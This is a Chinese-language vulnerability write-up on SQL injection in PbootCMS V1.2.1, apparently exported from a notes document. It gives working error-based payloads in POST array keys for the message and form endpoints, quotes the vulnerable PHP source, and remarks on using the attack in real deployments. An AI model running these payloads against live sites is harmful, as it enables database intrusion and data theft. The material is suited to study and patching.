<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csB2D98684{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
			.cs508254C{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;text-decoration: none;}
			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="pbootcms-sql注入"><span class="csDE05BCC">PbootCMS sql</span><span class="csECDA2D3">注入</span></a></h1>
		<h2 class="cs868C439D">
			<a name="Xb6c99a01525a6db922ee2e879d46a4b7e140382"><span class="csB2D98684">0x01 </span><span class="cs83F14626">前台</span><span class="csB2D98684">home</span><span class="cs83F14626">模块注入漏洞</span></a></h2>
		<h2 class="cs868C439D">
			<a name="X1d62ea1a0177776d64c60c41e5ec6355adb9d6c"><span class="csB2D98684">0x01.1 </span><span class="cs83F14626">在线留言处</span><span class="csB2D98684">insert sql</span><span class="cs83F14626">注入</span></a></h2>
		<h3 class="cs868C439D">
			<a name="X1ef3501f9187c3d06a51f448076611ff45fc529"><span class="csD1E291E2">0x01.1.2 </span><span class="csD6CA00D2">漏洞演示</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">注：我本地测试的所以我把验证验证码那一步关闭了</span><span class="cs8926E06">=-=</span><span class="cs9C1B1871">，实战中请自己加上验证码</span></p><p class="cs40DD2BC9"><span><img src="Web安全/PbootCMS/PbootCMS%20sql%e6%b3%a8%e5%85%a5_files/image0.png" width="560" height="401" alt="" style="border-width:0px;" /></span></p><p class="cs3A447A38"><span class="cs9FB05234">url:http://127.0.0.1/cms/PbootCMS-V1.2.1/index.php/Message/add</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">post:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;contacts[content`,`create_time`,`update_time`) VALUES (&#39;1&#39;, &#39;1&#39; ,1 and updatexml(1,concat(0x3a,user()),1) );-- a] = 1111</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;content = 1111</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;mobile = 1111</span></p><p class="cs40DD2BC9"><span><img src="Web安全/PbootCMS/PbootCMS%20sql%e6%b3%a8%e5%85%a5_files/image1.png" width="560" height="243" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
			<a name="X51e8cbe7c6157b8b248c5d210f2b74680c03302"><span class="csD1E291E2">0x01.1.2 </span><span class="csD6CA00D2">漏洞解读</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">路径：</span><span class="cs8926E06">PbootCMS-V1.2.1\apps\home\controller\MessageController.php </span><span class="cs9C1B1871">方法：</span><span class="cs8926E06">add(</span></p><p class="cs3A447A38"><span class="cs9FB05234">// </span><span class="cs7FFD2630">留言新增</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public function add()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ($_POST) {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (time() - session(&#39;lastsub&#39;) &lt; 10) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;alert_back(&#39;</span><span class="cs7FFD2630">您提交太频繁了，请稍后再试！</span><span class="cs9FB05234">&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">验证码验证</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$checkcode = post(&#39;checkcode&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ($this-&gt;config(&#39;message_check_code&#39;)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// if (! $checkcode) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// &nbsp;&nbsp;&nbsp;&nbsp;alert_back(&#39;</span><span class="cs7FFD2630">验证码不能为空！</span><span class="cs9FB05234">&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// }</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ($checkcode != session(&#39;checkcode&#39;)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;alert_back(&#39;</span><span class="cs7FFD2630">验证码错误！</span><span class="cs9FB05234">&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">读取字段</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (! $form = $this-&gt;model-&gt;getFormField(1)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;alert_back(&#39;</span><span class="cs7FFD2630">留言表单不存在任何字段，请核对后重试！</span><span class="cs9FB05234">&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">接收数据</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$mail_body = &#39;&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foreach ($form as $value) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$field_data = post($value-&gt;name);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (is_array($field_data)) { // </span><span class="cs7FFD2630">如果是多选等情况时转换</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$field_data = implode(&#39;,&#39;, $field_data);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ($value-&gt;required &amp;&amp; ! $field_data) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;alert_back($value-&gt;description . &#39;</span><span class="cs7FFD2630">不能为空！</span><span class="cs9FB05234">&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data[$value-&gt;name] = post($value-&gt;name);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$mail_body .= $value-&gt;description . &#39;</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">&#39; . post($value-&gt;name) . &#39;&lt;br&gt;&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">设置额外数据</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ($data) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data[&#39;acode&#39;] = session(&#39;lg&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data[&#39;user_ip&#39;] = ip2long(get_user_ip());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data[&#39;user_os&#39;] = get_user_os();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data[&#39;user_bs&#39;] = get_user_bs();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data[&#39;recontent&#39;] = &#39;&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data[&#39;status&#39;] = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data[&#39;create_user&#39;] = &#39;guest&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data[&#39;update_user&#39;] = &#39;guest&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ($this-&gt;model-&gt;addMessage($data)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;session(&#39;lastsub&#39;, time()); // </span><span class="cs7FFD2630">记录最后提交时间</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;log(&#39;</span><span class="cs7FFD2630">留言提交成功！</span><span class="cs9FB05234">&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ($this-&gt;config(&#39;message_send_mail&#39;) &amp;&amp; $this-&gt;config(&#39;message_send_to&#39;)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$mail_subject = &quot;</span><span class="cs7FFD2630">【</span><span class="cs9FB05234">PbootCMS</span><span class="cs7FFD2630">】您有新的表单数据，请注意查收！</span><span class="cs9FB05234">&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$mail_body .= &#39;&lt;br&gt;</span><span class="cs7FFD2630">来自网站</span><span class="cs9FB05234">&#39; . get_http_url() . &#39;</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">&#39; . date(&#39;Y-m-d H:i:s&#39;) . &#39;</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sendmail($this-&gt;config(), $this-&gt;config(&#39;message_send_to&#39;), $mail_subject, $mail_body);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;alert_location(&#39;</span><span class="cs7FFD2630">提交成功！</span><span class="cs9FB05234">&#39;, &#39;-1&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;log(&#39;</span><span class="cs7FFD2630">留言提交失败！</span><span class="cs9FB05234">&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;alert_back(&#39;</span><span class="cs7FFD2630">提交失败！</span><span class="cs9FB05234">&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;error(&#39;</span><span class="cs7FFD2630">提交失败，请使用</span><span class="cs9FB05234">POST</span><span class="cs7FFD2630">方式提交！</span><span class="cs9FB05234">&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">可以看到，整个逻辑下来的意思就是说，查询出数据库一条数据，然后接收外部</span><span class="cs8926E06"> POST </span><span class="cs9C1B1871">内容，只匹配数据库的字段，相同才会拼接到</span><span class="cs8926E06"> $_data</span><span class="cs9C1B1871">数组</span></p><p class="cs3A447A38"><span class="cs7FFD2630">然后就会带入</span><span class="cs9FB05234"> $this-&gt;model-&gt;addMessage(data) </span><span class="cs7FFD2630">执行语句</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">路径：</span><span class="cs8926E06">PbootCMS-V1.2.1\apps\home\model\ParserModel.php </span><span class="cs9C1B1871">方法：</span><span class="cs8926E06">addMessage(</span></p><p class="cs3A447A38"><span class="cs9FB05234">// </span><span class="cs7FFD2630">新增留言</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">public function addMessage($data)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return parent::table(&#39;ay_message&#39;)-&gt;autoTime()-&gt;insert($data);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">根据</span><span class="cs8926E06">6.0</span><span class="cs9C1B1871">可以看到带入了进入了</span><span class="cs8926E06"> insert </span><span class="cs9C1B1871">那么我们传的二维数组刚好可以控制</span><span class="cs8926E06">key </span><span class="cs9C1B1871">带入数据库查询引发注入</span></p><h2 class="cs868C439D">
			<a name="X56d4799a8204f4f14ccb5927e7fc79c2b13e560"><span class="csB2D98684">0x01.2 </span><span class="cs83F14626">免费通话</span><span class="csB2D98684">insert sql</span><span class="cs83F14626">注入</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">注：本地测试的时候，这个地方的注入需要后台添加一条数据才能注！真实环境的话，开放了这个功能直接抓包即可</span><span class="cs8926E06"> </span><span class="cs9C1B1871">进入后台</span></p><p class="cs40DD2BC9"><span><img src="Web安全/PbootCMS/PbootCMS%20sql%e6%b3%a8%e5%85%a5_files/image2.png" width="560" height="285" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/PbootCMS/PbootCMS%20sql%e6%b3%a8%e5%85%a5_files/image3.png" width="560" height="174" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/PbootCMS/PbootCMS%20sql%e6%b3%a8%e5%85%a5_files/image4.png" width="560" height="330" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/PbootCMS/PbootCMS%20sql%e6%b3%a8%e5%85%a5_files/image5.png" width="560" height="214" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
			<a name="X53d88558802f44233921513de3c1d87738b2e2e"><span class="csD1E291E2">0x08.2.1 </span><span class="csD6CA00D2">漏洞演示</span></a></h3>
		<p class="cs40DD2BC9"><span><img src="Web安全/PbootCMS/PbootCMS%20sql%e6%b3%a8%e5%85%a5_files/image6.png" width="560" height="282" alt="" style="border-width:0px;" /></span></p><p class="cs3A447A38"><span class="cs9FB05234">url</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">http://127.0.0.1/cms/PbootCMS-V1.2.1/index.php/Form/add?fcode=2</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">post</span><span class="cs7FFD2630">：</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;tel[tel`) VALUES ( 1 and updatexml(1,concat(0x3a,user()),1) );-- a] = 1111</span></p><p class="cs40DD2BC9"><span><img src="Web安全/PbootCMS/PbootCMS%20sql%e6%b3%a8%e5%85%a5_files/image7.png" width="560" height="209" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
			<a name="X97d3548f44c4fb90a28bf3017f44049e1170894"><span class="csD1E291E2">0x08.2.2 </span><span class="csD6CA00D2">漏洞解读</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">路径：</span><span class="cs8926E06">PbootCMS-V1.2.1\apps\home\controller\FormController.php </span><span class="cs9C1B1871">方法：</span><span class="cs8926E06">add(</span></p><p class="cs3A447A38"><span class="cs9FB05234">// </span><span class="cs7FFD2630">表单提交</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public function add()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ($_POST) {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (time() - session(&#39;lastsub&#39;) &lt; 10) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;alert_back(&#39;</span><span class="cs7FFD2630">您提交太频繁了，请稍后再试！</span><span class="cs9FB05234">&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (! $fcode = get(&#39;fcode&#39;, &#39;var&#39;)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;alert_back(&#39;</span><span class="cs7FFD2630">传递的表单编码有误！</span><span class="cs9FB05234">&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ($fcode == 1) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;alert_back(&#39;</span><span class="cs7FFD2630">表单提交地址有误，留言提交请使用留言专用地址</span><span class="cs9FB05234">!&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">验证码验证</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;* $checkcode = post(&#39;checkcode&#39;);</span><span class="cs8926E06"><br/></span><span 